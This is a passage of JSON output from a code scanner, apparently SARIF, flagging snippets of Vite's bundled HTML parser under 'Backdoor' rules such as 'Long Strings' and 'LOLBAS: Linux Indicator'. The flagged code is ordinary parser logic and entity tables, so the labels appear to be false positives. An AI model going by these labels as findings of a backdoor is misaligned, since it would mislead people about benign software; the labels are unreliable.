                    "text": "ing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdentifier\"] = \"missing-doctype-public-identifier\";\n    ERR[\"missingDoctypeSystemIdentifier\"] = \"missing-doctype",
                    "rendered": {
                      "text": "ing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdentifier\"] = \"missing-doctype-public-identifier\";\n    ERR[\"missingDoctypeSystemIdentifier\"] = \"missing-doctype",
                      "markdown": "`ing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdentifier\"] = \"missing-doctype-public-identifier\";\n    ERR[\"missingDoctypeSystemIdentifier\"] = \"missing-doctype`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 8,
                  "endLine": 103,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdenti",
                    "rendered": {
                      "text": "\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdenti",
                      "markdown": "`\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missingQuoteBeforeDoctypeSystemIdentifier\"] = \"missing-quote-before-doctype-system-identifier\";\n    ERR[\"missingDoctypePublicIdenti`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 8,
                  "endLine": 102,
                  "endColumn": 67,
                  "snippet": {
                    "text": "  ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n    ERR[\"missingWhitespaceBetweenAttributes\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missing",
                    "rendered": {
                      "text": "  ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n    ERR[\"missingWhitespaceBetweenAttributes\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missing",
                      "markdown": "`  ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n    ERR[\"missingWhitespaceBetweenAttributes\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";\n    ERR[\"missingQuoteBeforeDoctypePublicIdentifier\"] = \"missing-quote-before-doctype-public-identifier\";\n    ERR[\"missing`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 8,
                  "endLine": 101,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n    ERR[\"missingWhitespaceBetweenAttributes\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";",
                    "rendered": {
                      "text": "\"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n    ERR[\"missingWhitespaceBetweenAttributes\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";",
                      "markdown": "`\"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n    ERR[\"missingWhitespaceBetweenAttributes\"] = \"missing-whitespace-between-attributes\";\n    ERR[\"missingWhitespaceAfterDoctypePublicKeyword\"] = \"missing-whitespace-after-doctype-public-keyword\";\n    ERR[\"missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers\"] = \"missing-whitespace-between-doctype-public-and-system-identifiers\";\n    ERR[\"missingWhitespaceAfterDoctypeSystemKeyword\"] = \"missing-whitespace-after-doctype-system-keyword\";`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 8,
                  "endLine": 96,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    ERR[\"unknownNamedCharacterReference\"] = \"unknown-named-character-reference\";\n    ERR[\"missingSemicolonAfterCharacterReference\"] = \"missing-semicolon-after-character-reference\";\n    ERR[\"unexpectedCharacterAfterDoctypeSystemIdentifier\"] = \"unexpected-character-after-doctype-system-identifier\";\n    ERR[\"unexpectedCharacterInUnquotedAttributeValue\"] = \"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n",
                    "rendered": {
                      "text": "    ERR[\"unknownNamedCharacterReference\"] = \"unknown-named-character-reference\";\n    ERR[\"missingSemicolonAfterCharacterReference\"] = \"missing-semicolon-after-character-reference\";\n    ERR[\"unexpectedCharacterAfterDoctypeSystemIdentifier\"] = \"unexpected-character-after-doctype-system-identifier\";\n    ERR[\"unexpectedCharacterInUnquotedAttributeValue\"] = \"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n",
                      "markdown": "`    ERR[\"unknownNamedCharacterReference\"] = \"unknown-named-character-reference\";\n    ERR[\"missingSemicolonAfterCharacterReference\"] = \"missing-semicolon-after-character-reference\";\n    ERR[\"unexpectedCharacterAfterDoctypeSystemIdentifier\"] = \"unexpected-character-after-doctype-system-identifier\";\n    ERR[\"unexpectedCharacterInUnquotedAttributeValue\"] = \"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n    ERR[\"missingAttributeValue\"] = \"missing-attribute-value\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 8,
                  "endLine": 95,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    ERR[\"unexpectedCharacterInAttributeName\"] = \"unexpected-character-in-attribute-name\";\n    ERR[\"unknownNamedCharacterReference\"] = \"unknown-named-character-reference\";\n    ERR[\"missingSemicolonAfterCharacterReference\"] = \"missing-semicolon-after-character-reference\";\n    ERR[\"unexpectedCharacterAfterDoctypeSystemIdentifier\"] = \"unexpected-character-after-doctype-system-identifier\";\n    ERR[\"unexpectedCharacterInUnquotedAttributeValue\"] = \"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n",
                    "rendered": {
                      "text": "    ERR[\"unexpectedCharacterInAttributeName\"] = \"unexpected-character-in-attribute-name\";\n    ERR[\"unknownNamedCharacterReference\"] = \"unknown-named-character-reference\";\n    ERR[\"missingSemicolonAfterCharacterReference\"] = \"missing-semicolon-after-character-reference\";\n    ERR[\"unexpectedCharacterAfterDoctypeSystemIdentifier\"] = \"unexpected-character-after-doctype-system-identifier\";\n    ERR[\"unexpectedCharacterInUnquotedAttributeValue\"] = \"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n",
                      "markdown": "`    ERR[\"unexpectedCharacterInAttributeName\"] = \"unexpected-character-in-attribute-name\";\n    ERR[\"unknownNamedCharacterReference\"] = \"unknown-named-character-reference\";\n    ERR[\"missingSemicolonAfterCharacterReference\"] = \"missing-semicolon-after-character-reference\";\n    ERR[\"unexpectedCharacterAfterDoctypeSystemIdentifier\"] = \"unexpected-character-after-doctype-system-identifier\";\n    ERR[\"unexpectedCharacterInUnquotedAttributeValue\"] = \"unexpected-character-in-unquoted-attribute-value\";\n    ERR[\"eofBeforeTagName\"] = \"eof-before-tag-name\";\n    ERR[\"eofInTag\"] = \"eof-in-tag\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 8,
                  "endLine": 83,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    ERR[\"controlCharacterInInputStream\"] = \"control-character-in-input-stream\";\n    ERR[\"noncharacterInInputStream\"] = \"noncharacter-in-input-stream\";\n    ERR[\"surrogateInInputStream\"] = \"surrogate-in-input-stream\";\n    ERR[\"nonVoidHtmlElementStartTagWithTrailingSolidus\"] = \"non-void-html-element-start-tag-with-trailing-solidus\";\n    ERR[\"endTagWithAttributes\"] = \"end-tag-with-attributes\";\n    ERR[\"endTagWithTrailingSolidus\"] = \"end-tag-with-trailing-solidus\";\n    ERR[\"unexpectedSolidusInTag\"] = \"unexpected-solidus-in-tag\";\n",
                    "rendered": {
                      "text": "    ERR[\"controlCharacterInInputStream\"] = \"control-character-in-input-stream\";\n    ERR[\"noncharacterInInputStream\"] = \"noncharacter-in-input-stream\";\n    ERR[\"surrogateInInputStream\"] = \"surrogate-in-input-stream\";\n    ERR[\"nonVoidHtmlElementStartTagWithTrailingSolidus\"] = \"non-void-html-element-start-tag-with-trailing-solidus\";\n    ERR[\"endTagWithAttributes\"] = \"end-tag-with-attributes\";\n    ERR[\"endTagWithTrailingSolidus\"] = \"end-tag-with-trailing-solidus\";\n    ERR[\"unexpectedSolidusInTag\"] = \"unexpected-solidus-in-tag\";\n",
                      "markdown": "`    ERR[\"controlCharacterInInputStream\"] = \"control-character-in-input-stream\";\n    ERR[\"noncharacterInInputStream\"] = \"noncharacter-in-input-stream\";\n    ERR[\"surrogateInInputStream\"] = \"surrogate-in-input-stream\";\n    ERR[\"nonVoidHtmlElementStartTagWithTrailingSolidus\"] = \"non-void-html-element-start-tag-with-trailing-solidus\";\n    ERR[\"endTagWithAttributes\"] = \"end-tag-with-attributes\";\n    ERR[\"endTagWithTrailingSolidus\"] = \"end-tag-with-trailing-solidus\";\n    ERR[\"unexpectedSolidusInTag\"] = \"unexpected-solidus-in-tag\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 359,
                  "startColumn": 352,
                  "endLine": 359,
                  "endColumn": 396,
                  "snippet": {
                    "text": "de\\u07a2\\u07d6\\u080f\\u0a4a\\u0a91\\u0da1\\u0e6d\\u0f09\\u0f26\\u10ca\\u1228\\u12e1\\u1415\\u149d\\u14c3\\u14df\\u1525\\0\\0\\0\\0\\0\\0\\u156b\\u16cd\\u198d\\u1c12\\u1ddd\\u1f7e\\u2060\\u21b0\\u228d\\u23c0\\u23fb\\u2442\\u2824\\u2912\\u2d08\\u2e48\\u2fce\\u3016\\u32ba\\u3639\\u37ac\\u38fe\\u3a28\\u3a71\\u3ae0\\u3b2e\\u0800EMabcfglmnoprstu\\\\bfms\\x7f\\x84\\x8b\\x90\\x95\\x98\\xa6\\xb3\\xb9\\xc8\\xcflig\\u803b\\xc6\\u40c6P\\u803b&\\u4026cute\\u803b\\xc1\\u40c1reve;\\u4102\\u0100iyx}rc\\u803b\\xc2\\u40c2;\\u4410r;\\uc000\\ud835\\udd04rave\\u803b\\xc0\\u40c0pha;\\u4391acr;\\u4100d;\\u6a53\\u0100gp\\x9d\\xa1on;\\u4104f;\\uc000\\ud835\\udd38plyFunction;\\u6061ing\\u803b\\xc5\\u40c5\\u0100cs\\xbe\\xc3r;\\uc000\\ud835\\udc9cign;\\u6254ilde\\",
                    "rendered": {
                      "text": "de\\u07a2\\u07d6\\u080f\\u0a4a\\u0a91\\u0da1\\u0e6d\\u0f09\\u0f26\\u10ca\\u1228\\u12e1\\u1415\\u149d\\u14c3\\u14df\\u1525\\0\\0\\0\\0\\0\\0\\u156b\\u16cd\\u198d\\u1c12\\u1ddd\\u1f7e\\u2060\\u21b0\\u228d\\u23c0\\u23fb\\u2442\\u2824\\u2912\\u2d08\\u2e48\\u2fce\\u3016\\u32ba\\u3639\\u37ac\\u38fe\\u3a28\\u3a71\\u3ae0\\u3b2e\\u0800EMabcfglmnoprstu\\\\bfms\\x7f\\x84\\x8b\\x90\\x95\\x98\\xa6\\xb3\\xb9\\xc8\\xcflig\\u803b\\xc6\\u40c6P\\u803b&\\u4026cute\\u803b\\xc1\\u40c1reve;\\u4102\\u0100iyx}rc\\u803b\\xc2\\u40c2;\\u4410r;\\uc000\\ud835\\udd04rave\\u803b\\xc0\\u40c0pha;\\u4391acr;\\u4100d;\\u6a53\\u0100gp\\x9d\\xa1on;\\u4104f;\\uc000\\ud835\\udd38plyFunction;\\u6061ing\\u803b\\xc5\\u40c5\\u0100cs\\xbe\\xc3r;\\uc000\\ud835\\udc9cign;\\u6254ilde\\",
                      "markdown": "`de\\u07a2\\u07d6\\u080f\\u0a4a\\u0a91\\u0da1\\u0e6d\\u0f09\\u0f26\\u10ca\\u1228\\u12e1\\u1415\\u149d\\u14c3\\u14df\\u1525\\0\\0\\0\\0\\0\\0\\u156b\\u16cd\\u198d\\u1c12\\u1ddd\\u1f7e\\u2060\\u21b0\\u228d\\u23c0\\u23fb\\u2442\\u2824\\u2912\\u2d08\\u2e48\\u2fce\\u3016\\u32ba\\u3639\\u37ac\\u38fe\\u3a28\\u3a71\\u3ae0\\u3b2e\\u0800EMabcfglmnoprstu\\\\bfms\\x7f\\x84\\x8b\\x90\\x95\\x98\\xa6\\xb3\\xb9\\xc8\\xcflig\\u803b\\xc6\\u40c6P\\u803b&\\u4026cute\\u803b\\xc1\\u40c1reve;\\u4102\\u0100iyx}rc\\u803b\\xc2\\u40c2;\\u4410r;\\uc000\\ud835\\udd04rave\\u803b\\xc0\\u40c0pha;\\u4391acr;\\u4100d;\\u6a53\\u0100gp\\x9d\\xa1on;\\u4104f;\\uc000\\ud835\\udd38plyFunction;\\u6061ing\\u803b\\xc5\\u40c5\\u0100cs\\xbe\\xc3r;\\uc000\\ud835\\udc9cign;\\u6254ilde\\`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4989,
                  "startColumn": 11,
                  "endLine": 4989,
                  "endColumn": 17,
                  "snippet": {
                    "text": "                this.formElement = node;\n                break;\n            }\n            node = this.treeAdapter.getParentNode(node);\n        }\n    }\n    _initTokenizerForFragmentParsing() {\n",
                    "rendered": {
                      "text": "                this.formElement = node;\n                break;\n            }\n            node = this.treeAdapter.getParentNode(node);\n        }\n    }\n    _initTokenizerForFragmentParsing() {\n",
                      "markdown": "`                this.formElement = node;\n                break;\n            }\n            node = this.treeAdapter.getParentNode(node);\n        }\n    }\n    _initTokenizerForFragmentParsing() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4983,
                  "startColumn": 11,
                  "endLine": 4983,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            : this.openElements.current;\n    }\n    _findFormInFragmentContext() {\n        let node = this.fragmentContext;\n        while (node) {\n            if (this.treeAdapter.getTagName(node) === TAG_NAMES.FORM) {\n                this.formElement = node;\n",
                    "rendered": {
                      "text": "            : this.openElements.current;\n    }\n    _findFormInFragmentContext() {\n        let node = this.fragmentContext;\n        while (node) {\n            if (this.treeAdapter.getTagName(node) === TAG_NAMES.FORM) {\n                this.formElement = node;\n",
                      "markdown": "`            : this.openElements.current;\n    }\n    _findFormInFragmentContext() {\n        let node = this.fragmentContext;\n        while (node) {\n            if (this.treeAdapter.getTagName(node) === TAG_NAMES.FORM) {\n                this.formElement = node;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 4343,
                  "startColumn": 17,
                  "endLine": 4343,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            doctypeNode.systemId = systemId;\n        }\n        else {\n            const node = {\n                nodeName: '#documentType',\n                name,\n                publicId,\n",
                    "rendered": {
                      "text": "            doctypeNode.systemId = systemId;\n        }\n        else {\n            const node = {\n                nodeName: '#documentType',\n                name,\n                publicId,\n",
                      "markdown": "`            doctypeNode.systemId = systemId;\n        }\n        else {\n            const node = {\n                nodeName: '#documentType',\n                name,\n                publicId,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 3817,
                  "startColumn": 54,
                  "endLine": 3817,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    //------------------------------------------------------------------\n    _stateDecimalCharacterReference(cp) {\n        if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 10 + cp - 0x30;\n        }\n        else if (cp === CODE_POINTS.SEMICOLON) {\n            this.state = State.NUMERIC_CHARACTER_REFERENCE_END;\n",
                    "rendered": {
                      "text": "    //------------------------------------------------------------------\n    _stateDecimalCharacterReference(cp) {\n        if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 10 + cp - 0x30;\n        }\n        else if (cp === CODE_POINTS.SEMICOLON) {\n            this.state = State.NUMERIC_CHARACTER_REFERENCE_END;\n",
                      "markdown": "`    //------------------------------------------------------------------\n    _stateDecimalCharacterReference(cp) {\n        if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 10 + cp - 0x30;\n        }\n        else if (cp === CODE_POINTS.SEMICOLON) {\n            this.state = State.NUMERIC_CHARACTER_REFERENCE_END;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 3802,
                  "startColumn": 54,
                  "endLine": 3802,
                  "endColumn": 58,
                  "snippet": {
                    "text": "            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n        }\n        else if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x30;\n        }\n        else if (cp === CODE_POINTS.SEMICOLON) {\n            this.state = State.NUMERIC_CHARACTER_REFERENCE_END;\n",
                    "rendered": {
                      "text": "            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n        }\n        else if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x30;\n        }\n        else if (cp === CODE_POINTS.SEMICOLON) {\n            this.state = State.NUMERIC_CHARACTER_REFERENCE_END;\n",
                      "markdown": "`            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n        }\n        else if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x30;\n        }\n        else if (cp === CODE_POINTS.SEMICOLON) {\n            this.state = State.NUMERIC_CHARACTER_REFERENCE_END;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-D-7KCb9p.js"
                },
                "region": {
                  "startLine": 3799,
                  "startColumn": 54,
                  "endLine": 3799,
                  "endColumn": 58,
                  "snippet": {
                    "text": "            this.charRefCode = this.charRefCode * 16 + cp - 0x37;\n        }\n        else if (isAsciiLowerHexDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x57;\n        }\n        else if (isAsciiDigit(cp)) {\n            this.charRefCode = this.charRefCode * 16 + cp - 0x30;\n",
                    "rendered": {
